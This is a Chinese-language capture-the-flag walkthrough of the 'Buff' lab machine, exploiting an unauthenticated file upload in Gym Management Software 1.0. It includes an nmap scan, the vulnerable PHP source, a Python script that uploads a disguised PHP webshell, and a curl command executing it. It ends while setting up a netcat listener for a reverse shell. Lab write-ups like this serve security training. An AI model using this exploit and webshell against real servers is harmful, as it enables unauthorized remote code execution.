## Buff
```
[★]$ nmap -sC -sV 10.129.2.18
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-05 03:10 CST
Nmap scan report for 10.129.2.18
Host is up (0.067s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
```
#### 在浏览器8080端口，Contact：
```
    mrb3n's Bro Hut
    Made using Gym Management Software 1.0 
```
### Foothold
#### 我们知道web应用程序正在运行Gym Management Software 1.0。寻找此应用程序的已知问题揭示了未经身份验证的文件上传漏洞，其中允许攻击者获得RCE。
#### 我们可以从这里下载健身房管理软件。让我们看一下源代码理解它是如何工作的。
https://projectworlds.com/free-projects/php-projects/gym-management-system-project-in-php/
#### 点击‘ Download Poject'下载Gym-Management-System-Project-in-PHP.zip
```
[★]$ unzip Gym-Management-System-Project-in-PHP.zip
[★]$ cd Gym-Management-System-Project-in-PHP
[★]$ ls
 4.jpg         editp.php        LICENSE                  register_success.php
 about.php     ex               members.sql              subfeed.php
 admin         facilities.php   Navjeet.jpg              table.sql
 att           Feedback.php    'New Text Document.txt'   upload
 att.php       home.php         packages.php             upload.php
 boot          img              profile                  up.php
 contact.php   include          README.md                workouts
 edit.php      index.php        register.php

```
#### 根据对该应用程序的公开分析，upload.php存在漏洞是因为应用程序不检查用户是否经过身份验证。
```
[★]$ cat upload.php
<?php
include_once 'include/db_connect.php';
include_once 'include/functions.php';
$user = $_GET['id'];
$allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
$extension = @end(explode(".", $_FILES["file"]["name"]));
if(isset($_POST['pupload'])){
if ((($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/JPG")
|| ($_FILES["file"]["type"] == "image/png")
|| ($_FILES["file"]["type"] == "image/pjpeg"))
&& ($_FILES["file"]["size"] < 20000000000000)
&& in_array($extension, $allowedExts))
  {
  if ($_FILES["file"]["error"] > 0)
    {
    echo "Return Code: " . $_FILES["file"]["error"] . "<br>";
    }
  else
    {
    

    if (file_exists("upload/" . $_FILES["file"]["name"]))
      {
      unlink("upload/" . $_FILES["file"]["name"]);
      }
    else
      {
          $pic=$_FILES["file"]["name"];
            $conv=explode(".",$pic);
            $ext=$conv['1'];

      move_uploaded_file($_FILES["file"]["tmp_name"],
      "upload/". $user.".".$ext);
      $url=$user.".".$ext;
    
      $query="update members set pic=1, picName='$url' where id='$user'";
      if($upl=$mysqli->query($query)){
          header("location: profile/i.php");
              }
      }
    }
  }
else
  
  header("location: /profile/i.php");

  }

?>
```
#### 查看upload.php的源代码，我们看到它接受GET参数id和将值分配给可变用户。它还检查图像文件是否有效，但我们可以绕过这些过滤器通过添加双扩展名。让我们创建一个简单的Python脚本来上传我们的恶意PHP代码
```
[★]$ cat upload.py
#!/usr/bin/env python3

import requests

def Main():
    url = "http://10.129.2.18:8080/upload.php?id=test"
    s = requests.Session()
    s.get(url, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x0d\x0a\x1a'
    png = {
            'file':
            (
                'test.php.png',
                PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["cmd"]); ?>',
                'image/png',
                {'Content-Disposition': 'form-data'}
                )
            }
    data = {'pupload': 'upload'}
    r = s.post(url=url, files=png, data=data, verify=False)
    print("Uploaded!")

if __name__ == "__main__":
    Main()


```
#### 我们通过在PNG文件前加上magic bytes for来满足检查这是一个有效的PNG文件十六进制格式为0x8950。
https://en.wikipedia.org/wiki/List_of_file_signatures
#### 89 50 4E 47 0D 0A 1A 0A  	‰PNG␍␊␚␊	0	png
#### webshell中的PHP代码将执行我们在GET请求中提供的任何命令cmd参数。让我们执行Python代码。
```
[★]$ python3 upload.py
Uploaded!
```
#### 接下来，让我们导航到/upload/test.php并尝试执行一个命令。
```
[★]$ curl http://10.129.2.18:8080/upload/test.php?cmd=whoami
	PN
�
buff\shaun
```
```
[★]$ python3 -m http.server  8011
Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...

[★]$ nc -lvnp 4444
listening on [any] 4444 ...
```
#### 最后，发出下面的命令来下载nc.exe并执行它来生成一个反向shell
